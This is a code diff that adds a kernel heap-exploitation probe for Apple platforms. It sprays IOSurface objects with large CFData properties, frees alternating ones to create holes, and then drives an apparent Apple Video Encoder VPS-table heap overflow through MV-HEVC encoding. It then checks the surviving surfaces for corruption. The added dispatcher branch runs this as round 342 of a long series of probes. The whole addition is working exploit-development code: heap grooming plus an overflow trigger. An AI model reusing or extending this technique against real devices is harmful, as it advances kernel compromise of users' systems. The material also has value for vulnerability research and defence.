@@ -14099,6 +14099,184 @@ static void r335_probe(void) {
     fflush(stdout);
 }
 
+/* r339: AVE Heap Overflow with IOSurface Property Spray
+   r338: OOL data in KHEAP_DATA_BUFFERS, AVE VPS in KHEAP_DEFAULT (IOMalloc).
+   IOSurfaceSetValue stores property data via IOMalloc → same heap as AVE.
+   Strategy: Create IOSurfaces, set large (0xC000) CFData properties on each,
+   release some surfaces (freeing IOMalloc props), trigger AVE VPS overflow,
+   read back surviving surface properties for corruption. */
+static void r339_probe(void) {
+    rlog("\n=== r339: AVE Overflow + IOSurface Property Spray ===\n");
+    rlog("  IOSurfaceSetValue → IOMalloc → KHEAP_DEFAULT (same heap as AVE)\n\n");
+    fflush(stdout);
+
+    if (phase1_verify() != 0) return;
+
+    /* ---- Part 1: Create surfaces and set large property values ---- */
+    rlog("--- Part 1: IOSurface property spray (0xC000 each) ---\n");
+    fflush(stdout);
+
+    #define R339_SPRAY    256
+    #define R339_PROP_SZ  0xBF00  /* Slightly under 0xC000 to account for dict overhead */
+    #define R339_CANARY   0xCD
+
+    IOSurfaceRef r339_surfs[R339_SPRAY];
+    int r339_created = 0;
+
+    /* Create canary data */
+    uint8_t *canary = (uint8_t *)malloc(R339_PROP_SZ);
+    if (!canary) { rlog("  FAIL: malloc\n"); return; }
+    memset(canary, R339_CANARY, R339_PROP_SZ);
+
+    for (int i = 0; i < R339_SPRAY; i++) {
+        CFMutableDictionaryRef props = CFDictionaryCreateMutable(
+            kCFAllocatorDefault, 0,
+            &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+        int w = 32, h = 32, bpe = 4, bpr = w * bpe;
+        int alloc_sz = bpr * h;
+        uint32_t pf = 0x42475241; /* BGRA */
+        CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef nbpe = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef nbpr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+        CFNumberRef nsz = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz);
+        CFNumberRef npf = CFNumberCreate(NULL, kCFNumberSInt32Type, &pf);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nw);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nh);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nbpe);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nbpr);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nsz);
+        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), npf);
+        r339_surfs[i] = IOSurfaceCreate(props);
+        CFRelease(nw); CFRelease(nh); CFRelease(nbpe);
+        CFRelease(nbpr); CFRelease(nsz); CFRelease(npf);
+        CFRelease(props);
+
+        if (r339_surfs[i]) {
+            r339_created++;
+            /* Set a large property on the surface → IOMalloc in kernel */
+            /* Write index marker into canary data */
+            ((uint32_t *)canary)[0] = 0xFACE0000 | i;
+            ((uint32_t *)canary)[1] = 0xBEEF0000 | i;
+            CFDataRef data = CFDataCreate(kCFAllocatorDefault, canary, R339_PROP_SZ);
+            IOSurfaceSetValue(r339_surfs[i], CFSTR("spray_data"), data);
+            CFRelease(data);
+        }
+    }
+    rlog("  Created %d surfaces with 0x%X-byte properties\n", r339_created, R339_PROP_SZ);
+    fflush(stdout);
+
+    /* ---- Part 2: Free alternating surfaces (creates holes) ---- */
+    rlog("\n--- Part 2: Free alternating surfaces ---\n");
+    fflush(stdout);
+    int freed = 0;
+    for (int i = 1; i < r339_created; i += 2) {
+        if (r339_surfs[i]) {
+            CFRelease(r339_surfs[i]);
+            r339_surfs[i] = NULL;
+            freed++;
+        }
+    }
+    rlog("  Freed %d surfaces (IOMalloc props freed)\n", freed);
+    fflush(stdout);
+
+    /* ---- Part 3: AVE encode with proven lid=1 path ---- */
+    rlog("\n--- Part 3: AVE encode lid=1 (350 frames) ---\n");
+    fflush(stdout);
+    VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
+    int enc_ok = 0, enc_err = 0;
+    if (s) {
+        for (int f = 0; f < 350; f++) {
+            int st = encode_one_stereo_lid(s, f, 1920, 1080, 1);
+            if (st == 0) enc_ok++;
+            else enc_err++;
+            if (f % 100 == 0) {
+                rlog("  Frame %d: ok=%d err=%d\n", f, enc_ok, enc_err);
+                fflush(stdout);
+            }
+        }
+        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+        rlog("  Encode: %d ok, %d err\n", enc_ok, enc_err);
+        VTCompressionSessionInvalidate(s);
+        CFRelease(s);
+    } else {
+        rlog("  FAIL: create_mvhevc_encoder\n");
+    }
+    fflush(stdout);
+
+    /* ---- Part 4: Read back properties and check corruption ---- */
+    rlog("\n--- Part 4: Check IOSurface properties for corruption ---\n");
+    fflush(stdout);
+    int checked = 0, corrupted = 0;
+    for (int i = 0; i < r339_created; i += 2) {
+        if (!r339_surfs[i]) continue;
+        CFTypeRef val = IOSurfaceCopyValue(r339_surfs[i], CFSTR("spray_data"));
+        if (!val) continue;
+        if (CFGetTypeID(val) != CFDataGetTypeID()) {
+            CFRelease(val);
+            continue;
+        }
+        checked++;
+        CFDataRef data = (CFDataRef)val;
+        CFIndex len = CFDataGetLength(data);
+        const uint8_t *bytes = CFDataGetBytePtr(data);
+
+        /* Check canary integrity (skip first 8 bytes = our markers) */
+        int bad = 0;
+        int first_bad = -1;
+        for (int b = 8; b < (int)len && bad < 512; b++) {
+            if (bytes[b] != R339_CANARY) {
+                if (first_bad < 0) first_bad = b;
+                bad++;
+            }
+        }
+        /* Check header markers */
+        uint32_t hdr0 = 0, hdr1 = 0;
+        if (len >= 8) {
+            hdr0 = ((const uint32_t *)bytes)[0];
+            hdr1 = ((const uint32_t *)bytes)[1];
+        }
+        int hdr_ok = (hdr0 == (0xFACE0000 | (uint32_t)i)) && (hdr1 == (0xBEEF0000 | (uint32_t)i));
+
+        if (!hdr_ok || bad > 0) {
+            corrupted++;
+            rlog("  *** SURFACE[%d] PROP CORRUPTED! ***\n", i);
+            rlog("    hdr: 0x%08X 0x%08X %s\n", hdr0, hdr1, hdr_ok ? "OK" : "BAD");
+            rlog("    bad_bytes=%d first=0x%X len=%ld\n", bad, first_bad, (long)len);
+            if (first_bad >= 0) {
+                int ds = first_bad & ~0xF;
+                rlog("    @0x%04X: ", ds);
+                for (int x = ds; x < ds + 64 && x < (int)len; x++)
+                    rlog("%02X ", bytes[x]);
+                rlog("\n");
+            }
+            /* Dump start (overflow from previous alloc) */
+            rlog("    @0x0000: ");
+            for (int x = 0; x < 64 && x < (int)len; x++)
+                rlog("%02X ", bytes[x]);
+            rlog("\n");
+        }
+        CFRelease(val);
+    }
+
+    rlog("  Checked %d, corrupted %d\n", checked, corrupted);
+    if (corrupted > 0) {
+        rlog("  *** HEAP CORRUPTION VIA IOSURFACE PROPERTIES! ***\n");
+    } else {
+        rlog("  No corruption in IOSurface properties.\n");
+        rlog("  VPS table may use type-specific zone, not shared IOMalloc.\n");
+    }
+
+    /* Cleanup */
+    for (int i = 0; i < r339_created; i++)
+        if (r339_surfs[i]) CFRelease(r339_surfs[i]);
+    free(canary);
+
+    rlog("\n=== r339 complete ===\n");
+    fflush(stdout);
+}
+
 /* r338: AVE Heap Overflow with Mach OOL + Correct Encoder Path
    r337 found 0 actual corruption — the manual VTCompressionSession setup
    didn't trigger the VPS table overflow path. Must use create_mvhevc_encoder()
@@ -46237,6 +46415,12 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 342) {
+            rlog("*** rounds=342: AVE Overflow + IOSurface Property Spray ***\n");
+            rlog("  r338: OOL in KHEAP_DATA_BUFFERS, not same heap as AVE IOMalloc.\n\n");
+            r339_probe();
             goto done;
         }
         if (rounds == 341) {
